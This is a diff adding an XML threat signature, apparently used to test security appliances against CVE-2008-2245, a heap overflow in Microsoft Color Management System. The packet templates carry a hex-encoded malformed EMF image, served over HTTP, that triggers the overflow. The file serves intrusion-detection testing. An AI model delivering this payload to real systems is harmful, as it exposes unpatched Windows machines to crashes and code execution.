@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Color Management System Crafted Path Name Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in Microsoft Color Management System. The vulnerability is due to a boundary error in the Microsoft Color Management System (MSCMS) module of the Microsoft Image Color Management (ICM) component. Remote unauthenticated attackers could exploit this vulnerability by persuading users to open a specially crafted image file. Successful exploitation would cause a heap buffer overflow that could allow the attacker to execute arbitrary code on the vulnerable system."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Windows"/>
+      <item value="Microsoft_Microsoft_Windows_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000_SP4"/>
+      <item value="Microsoft_Windows_XP_SP2"/>
+      <item value="Microsoft_Windows_XP_SP3"/>
+      <item value="Microsoft_Windows_XP_Professional_x64"/>
+      <item value="Microsoft_Windows_XP_Professional_x64_SP2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20080812-17"/>
+    <CVEID display="true" value="CVE-2008-2245"/>
+    <bugtraqID display="true" value="30594"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="e453c9b4d9ae28bb1db05fc26f6c9f97"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633602700629218750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1219718292" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="E"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0179" Identification="0044" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9803" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="02DA8961" AckNumber="5B41D636" HeaderLength="05" WindowSize="FFFF" Checksum="4DAF" UrgentPointer="0000" Options="" Payload="474554202F7E727A68616E2F706F632E656D6620485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E30290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0028" Identification="5234" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8764" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="5B41D636" AckNumber="02DA8AB2" HeaderLength="05" WindowSize="1920" Checksum="7214" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C2031342041756720323030382031383A33343A323720474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205468752C2031342041756720323030382031383A32383A323620474D540D0A455461673A2022353930313237652D3338342D34353436666162623936363830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203930300D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20766964656F2F756E6B6E6F776E0D0A0D0A0100000058000000010000000E0000001F030000570200002900000030020000BF800000985D000020454D460000010084030000040000000700000000000000000000000000000020030000580200004A010000F00000007100000018030000380000000100000000030000414141413A00616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616100000F01000063636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363630E00000014000000000000000000000014000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
